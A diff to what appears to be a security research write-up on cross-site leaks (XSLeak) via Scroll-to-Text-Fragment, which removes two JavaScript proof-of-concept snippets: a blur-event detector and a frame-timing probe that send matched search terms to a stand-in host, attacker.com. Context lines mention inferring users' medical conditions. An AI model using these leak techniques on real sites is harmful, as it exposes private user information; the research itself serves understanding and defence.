@@ -801,64 +801,7 @@ https://health.gov/patient-records#:~:text=depression
 
 Like this, by detecting whether searches occur for each disease name through CSS Injection or `IntersectionObserver` API, target users' medical information and disease information can be leaked. Like this, XSLeak vulnerabilities using STTF can leak meaningful information about target sites using users' permissions.
 
-Methods to manifest XSLeak vulnerabilities using STTF include various methods besides methods mentioned in this research. Like portal, XSLeak vulnerabilities can be manifested by detecting whether focusing is released in frames using `onblur` events.
-
-```html
-<script>
-  let blurDetected = false;
-
-  window.addEventListener("blur", () => {
-    if (!blurDetected) {
-      blurDetected = true;
-      fetch("https://attacker.com/leak?scroll_detected=true");
-    }
-  });
-
-  const popup = window.open(
-    "https://target.com#:~:text=confidential",
-    "_blank"
-  );
-
-  setTimeout(() => {
-    if (!blurDetected) {
-      fetch("https://attacker.com/leak?scroll_detected=false");
-    }
-    popup.close();
-  }, 3000);
-</script>
-```
-
-Also, Timing Attack attacks are possible using processing time differences between cases where text matching work exists and doesn't exist in STTF.
-
-```jsx
-function measureProcessingTime(targetUrl, searchTerm) {
-  const startTime = performance.now();
-  let frameCount = 0;
-
-  const measureFrame = () => {
-    frameCount++;
-    if (frameCount < 60) {
-      requestAnimationFrame(measureFrame);
-    } else {
-      const avgFrameTime = (performance.now() - startTime) / frameCount;
-
-      if (avgFrameTime > 20) {
-        fetch(
-          `https://attacker.com/leak?found=${searchTerm}&timing=${avgFrameTime}`
-        );
-      }
-    }
-  };
-
-  window.open(
-    `${targetUrl}#:~:text=${encodeURIComponent(searchTerm)}`,
-    "_blank"
-  );
-  requestAnimationFrame(measureFrame);
-}
-```
-
-The above example conducts time measurement using `performance` API for 1 second, then judges text existence based on whether processing time is above threshold. Like this, XSLeak vulnerabilities can be manifested in various ways using STTF functionality and various APIs, and attackers use appropriate methods suitable for their situations to leak information about target sites.
+XSLeak vulnerabilities can be manifested in various ways using STTF functionality and various APIs, and attackers use appropriate methods suitable for their situations to leak information about target sites.
 
 ### How does the XSLeak experimental feature apply to CTF?
 
